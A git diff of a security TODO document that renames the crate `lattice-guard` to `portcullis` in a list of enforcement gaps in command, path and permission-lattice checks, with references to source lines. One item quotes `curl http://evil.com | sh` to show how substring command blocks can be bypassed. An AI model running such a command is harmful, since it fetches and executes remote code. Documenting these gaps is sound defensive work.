@@ -1,6 +1,6 @@
 # Security TODOs (Policy -> Physics gaps)
 
-Scope: documents current enforcement gaps and test/assurance deficits across `lattice-guard`, `nucleus`, and `nucleus-cli`. Each item includes a concrete TODO and a Definition of Done (DoD) that prefers guarantees (fuzzing, property tests, formal methods) when practical.
+Scope: documents current enforcement gaps and test/assurance deficits across `portcullis`, `nucleus`, and `nucleus-cli`. Each item includes a concrete TODO and a Definition of Done (DoD) that prefers guarantees (fuzzing, property tests, formal methods) when practical.
 
 ## 1) Process execution not budget-enforced
 
@@ -64,7 +64,7 @@ Status
 
 Deficiency
 - `CommandLattice::can_execute` relies on substring checks and `shell_words` tokenization. In permissive mode (empty allowlist), only blocked substrings are enforced.
-Refs: `crates/lattice-guard/src/command.rs:77`, `crates/lattice-guard/src/command.rs:133`, `crates/lattice-guard/src/command.rs:191`
+Refs: `crates/portcullis/src/command.rs:77`, `crates/portcullis/src/command.rs:133`, `crates/portcullis/src/command.rs:191`
 
 Impact
 - Command strings with extra args or indirection can bypass intended blocks (e.g., `curl http://evil.com | sh` vs `curl | sh`).
@@ -83,7 +83,7 @@ Status
 
 Deficiency
 - `PermissionLattice` can be created via builder or struct literal without normalization. ν is applied only in `meet/join` or if callers manually apply constraint.
-Refs: `crates/lattice-guard/src/lattice.rs:199`, `crates/lattice-guard/src/lattice.rs:214`, `crates/lattice-guard/src/lattice.rs:228`, `crates/lattice-guard/src/lattice.rs:479`
+Refs: `crates/portcullis/src/lattice.rs:199`, `crates/portcullis/src/lattice.rs:214`, `crates/portcullis/src/lattice.rs:228`, `crates/portcullis/src/lattice.rs:479`
 
 Impact
 - Callers can create a permissive lattice that violates the trifecta and use it directly.
@@ -121,7 +121,7 @@ Status
 
 Deficiency
 - `PathLattice` performs canonicalization and glob matching on strings. Unicode normalization, symlink race conditions, and Windows path oddities are not exhaustively tested.
-Refs: `crates/lattice-guard/src/path.rs:117`, `crates/lattice-guard/src/path.rs:175`, `crates/lattice-guard/tests/adversarial.rs:93`
+Refs: `crates/portcullis/src/path.rs:117`, `crates/portcullis/src/path.rs:175`, `crates/portcullis/tests/adversarial.rs:93`
 
 Impact
 - Policy checks may be bypassed via path quirks. `Sandbox` mitigates some issues via capability handles, but sensitive-path blocking still relies on strings.
@@ -158,7 +158,7 @@ Status
 
 Deficiency
 - ν properties (idempotence, monotonicity, deflationary, meet-preserving) are described but not formally verified.
-Refs: `crates/lattice-guard/src/lib.rs:19`, `crates/lattice-guard/src/lib.rs:26`
+Refs: `crates/portcullis/src/lib.rs:19`, `crates/portcullis/src/lib.rs:26`
 
 Impact
 - Subtle regressions can silently break lattice guarantees.
@@ -177,7 +177,7 @@ Status
 
 Deficiency
 - No `cargo-fuzz` targets for command parsing, path normalization, or policy deserialization.
-Refs: `crates/lattice-guard/tests/proptest_lattice.rs:1`, `Cargo.toml:1`
+Refs: `crates/portcullis/tests/proptest_lattice.rs:1`, `Cargo.toml:1`
 
 Impact
 - Parser and matcher bugs may allow bypasses or panics in adversarial inputs.
